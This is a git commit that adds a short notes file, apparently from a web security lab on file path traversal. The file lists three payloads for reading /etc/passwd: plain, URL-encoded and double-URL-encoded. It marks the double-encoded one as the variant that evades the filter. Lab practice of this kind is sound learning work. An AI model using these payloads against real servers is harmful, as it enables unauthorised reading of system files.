965ac5b48a313ba362217ac3cdaea0add409ad86
Pranjal <pranjalruhela2811@gmail.com>
2023-07-08 10:53:04 +0530

    double URL encoding to evade filters

---
+++ FilePathTraversal/traversal sequences stripped with superfluous URL-decode/payload.js
@@ -0,0 +1,8 @@
+/*
+
+../../../etc/passwd                    NO
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd   URL encode    NO
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd   URL 2x encode YES
+
+
+*/
